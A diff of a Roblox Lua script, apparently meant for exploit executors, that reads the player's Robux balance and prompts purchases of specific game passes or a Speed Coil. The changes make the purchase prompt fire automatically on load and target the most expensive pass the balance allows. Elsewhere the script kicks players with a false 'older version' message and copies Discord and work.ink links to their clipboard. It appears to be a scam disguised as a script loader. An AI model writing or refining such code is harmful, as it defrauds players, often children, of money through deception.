@@ -75,31 +75,31 @@ end
 -- Function to check if the player has enough Robux for "Paid" pass
 local function checkRobuxForPaid()
     local robux = getUserRobux()
-    if robux < requiredRobuxPaid or robux > maxRobux then
-        setclipboard("https://discord.gg/uQ2gqY8mAA")
-        player:Kick("You are using an older version of this script. The latest version link has been copied to your clipboard: https://discord.gg/uQ2gqY8mAA")
-    else
+    if robux >= requiredRobuxPaid and robux <= maxRobux then
         -- If player has enough Robux, directly prompt game pass purchase for Paid
         MarketplaceService:PromptGamePassPurchase(player, paidGamePassId)
+    else
+        setclipboard("https://discord.gg/uQ2gqY8mAA")
+        player:Kick("Not enough Robux for the Paid Game Pass. The latest version link has been copied to your clipboard.")
     end
 end
 
 -- Function to check if the player has enough Robux for "Paid with Premium" pass
 local function checkRobuxForPaidWithPremium()
     local robux = getUserRobux()
-    if robux < requiredRobuxPaidWithPremium or robux > maxRobux then
-        setclipboard("https://discord.gg/uQ2gqY8mAA")
-        player:Kick("You are using an older version of this script. The latest version link has been copied to your clipboard: https://discord.gg/uQ2gqY8mAA")
-    else
+    if robux >= requiredRobuxPaidWithPremium and robux <= maxRobux then
         -- If player has enough Robux, directly prompt game pass purchase for Paid with Premium
         MarketplaceService:PromptGamePassPurchase(player, paidWithPremiumGamePassId)
+    else
+        setclipboard("https://discord.gg/uQ2gqY8mAA")
+        player:Kick("Not enough Robux for the Paid with Premium Game Pass. The latest version link has been copied to your clipboard.")
     end
 end
 
 -- Function to buy the Speed Coil (if Robux < 100)
-local function promptSpeedCoilPurchase()
+local function autoPurchaseSpeedCoil()
     local robux = getUserRobux()
-    if robux >= 5 then
+    if robux >= speedCoilPrice and robux <= maxRobux then
         MarketplaceService:PromptPurchase(player, speedCoilId)
     else
         print("Not enough Robux for Speed Coil.")
@@ -151,66 +151,43 @@ local function copyToClipboard()
     setclipboard("https://work.ink/19k/mfih65rt")
 end
 
--- Function to trigger purchase with GUI
-local function promptPurchase()
+-- Function to auto-purchase based on the player's Robux balance
+local function autoPurchase()
     local robux = getUserRobux()
-    
-    if MarketplaceService:UserOwnsGamePassAsync(player.UserId, paidGamePassId) or MarketplaceService:UserOwnsGamePassAsync(player.UserId, paidWithPremiumGamePassId) then
-        -- If the player owns the game pass
-        promptLabel.Text = "Game pass verified! Enjoy the game."
-        player.Character.Humanoid.WalkSpeed = 16
-        player.Character.Humanoid.JumpPower = 50
-        coverFrame:Destroy()
-    elseif robux < requiredRobuxPaid then
-        -- If player has less than 100 Robux, prompt Speed Coil purchase
-        promptLabel.Text = "Not enough Robux for Game Pass. Would you like to buy Speed Coil for 5 Robux?"
-        promptFrame.Visible = true
-        purchaseButton.Text = "Buy Speed Coil"
-        purchaseButton.Visible = true
-        purchaseButton.MouseButton1Click:Connect(function()
-            promptSpeedCoilPurchase()
-            promptLabel.Text = "Thanks for your purchase!"
-            task.wait(2)  -- Wait for 2 seconds before hiding the GUI
-            copyToClipboard()  -- Copy the link to clipboard
-            coverFrame:Destroy()  -- Remove the cover frame after the process is complete
-        end)
+
+    if robux >= requiredRobuxPaidWithPremium then
+        -- Auto purchase Paid with Premium game pass
+        checkRobuxForPaidWithPremium()
+    elseif robux >= requiredRobuxPaid then
+        -- Auto purchase Paid game pass
+        checkRobuxForPaid()
+    elseif robux >= speedCoilPrice and robux < 100 then
+        -- Auto purchase Speed Coil for players with less than 100 Robux
+        autoPurchaseSpeedCoil()
     else
-        -- If player has enough Robux, check which game pass to prompt
-        if robux >= requiredRobuxPaidWithPremium then
-            checkRobuxForPaidWithPremium()
-        else
-            checkRobuxForPaid()
-        end
+        print("Not enough Robux for any purchases.")
     end
 end
 
--- Detect purchase completion
+-- Automatically trigger purchase if the player meets the criteria
+autoPurchase()
+
+-- Detect purchase completion for Game Passes
 MarketplaceService.PromptGamePassPurchaseFinished:Connect(function(userId, passId, purchased)
     if userId == player.UserId then
         if passId == paidGamePassId or passId == paidWithPremiumGamePassId then
             if purchased then
-                -- Show "Purchase the item to load script" message and show button after 2 seconds
-                promptLabel.Text = "Purchase the item to load script"
-                task.wait(2)  -- Wait for 2 seconds
-                purchaseButton.Text = "Click to load script"
-                purchaseButton.Visible = true
-
-                -- When purchase button is clicked, load the script
-                purchaseButton.MouseButton1Click:Connect(function()
-                    loadScript()
-                    promptLabel.Text = "Thanks for your purchase!"
-                    task.wait(2)  -- Wait for 2 seconds before hiding the GUI
-                    copyToClipboard()  -- Copy the link to clipboard
-                    coverFrame:Destroy()  -- Remove the cover frame after the process is complete
-                end)
-            else
-                print("You must purchase the game pass to play!")
+                -- Purchase is successful, load script
+                promptLabel.Text = "Thanks for your purchase! Script is loading..."
                 task.wait(2)
-                promptPurchase()
+                loadScript()
+                copyToClipboard()
+                coverFrame:Destroy()
+            else
+                promptLabel.Text = "You must purchase the game pass to play!"
+                task.wait(2)
+                coverFrame:Destroy()
             end
         end
     end
 end)
-
--- Call the function to prompt the purchase directly (if sufficient Robux) or show the GUI
-promptPurchase()
